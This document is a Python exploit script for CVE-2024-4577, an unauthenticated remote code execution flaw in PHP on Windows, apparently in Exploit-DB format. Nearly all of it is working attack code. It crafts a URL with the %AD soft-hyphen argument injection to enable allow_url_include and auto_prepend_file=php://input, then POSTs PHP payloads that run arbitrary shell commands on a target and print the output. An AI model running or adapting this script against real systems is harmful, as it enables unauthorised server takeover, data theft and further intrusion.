# Exploit Title: PHP Windows Remote Code Execution (Unauthenticated)
# Exploit Author: abang tobias bake
# Vendor Homepage: https://www.php.net/downloads.php
# Version: PHP 8.3,* < 8.3.8,  8.2.*<8.2.20, 8.1.*, 8.1.29
# CVE : CVE-2024-4577

from requests import Request, Session
import sys
import urllib3

# Suppress insecure HTTPS connection warnings for local lab environments
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def title():
    # Added 'r' to fix the SyntaxWarning regarding backslashes
    print(r'''
    
   _______      ________    ___   ___ ___  _  _          _  _   _____ ______ ______ 
  / ____\ \    / /  ____|  |__ \ / _ \__ \| || |        | || | | ____|____  |____  |

 | |     \ \  / /| |__ ______ ) | | | | ) | || |_ ______| || |_| |__     / /    / / 
 | |      \ \/ / |  __|______/ /| | | |/ /|__   _|______|__   _|___ \   / /    / /  
 | |____   \  /  | |____    / /_| |_| / /_   | |           | |  ___) | / /    / /   
  \_____|   \/   |______|  |____|\___/____|  |_|           |_| |____/ /_/    /_/                                                                                                              
                                                                                                                      
                                                                              
Author: abang bake
Github: https://github.com/abang01
Linkedin: https://www.linkedin.com/in/pentester-ethicalhacker/
Code improvements: https://github.com/yealvarez/CVE/blob/main/CVE-2024-4577/exploit.py
    ''')   


def exploit(base_url, command):       
    # Fixed: Changed from a set {} to an ordered list [] so 'vulnerable' checks execute first
    payloads = [
        '<?php echo "vulnerable"; ?>',
        '<?php echo shell_exec("'+command+'"); ?>' 
    ]    
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    s = Session()
    
    # Fixed: Appended parameters to a distinct variable outside the loop to stop URL string compounding
    exploit_url = base_url.rstrip('/') + "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
    print(f"[*] Target Endpoint generated: {exploit_url}\n")
    
    for payload in payloads:
        req = Request('POST', exploit_url, data=payload, headers=headers)
        prepped = req.prepare()
        
        if 'Content-Type' in prepped.headers:
            del prepped.headers['Content-Type']
            
        try:
            resp = s.send(prepped, verify=False, timeout=15)       
            print(f"[+] Sent: {payload}")
            print(f"[+] Status: {resp.status_code}")
            print(f"[+] Response:\n{resp.text}\n")
            print("-" * 40)
        except Exception as e:
            print(f"[-] Request failed: {e}")


if __name__ == '__main__':
    title()
    
    # Fixed: Argument check set to < 3 to protect against missing parameters
    if len(sys.argv) < 3:
        # Replaced the original target examples with a clean, descriptive placeholder
        print('[+] USAGE:   python3 %s <target_url> <command>' % (sys.argv[0]))
        print('[+] EXAMPLE: python3 %s https://your-target-domain.com whoami\n' % (sys.argv[0]))        
        sys.exit(1)
    else:
        # Safely parse arguments and bundle multiple command words together
        target_input = sys.argv[1]
        command_input = " ".join(sys.argv[2:])
        exploit(target_input, command_input)
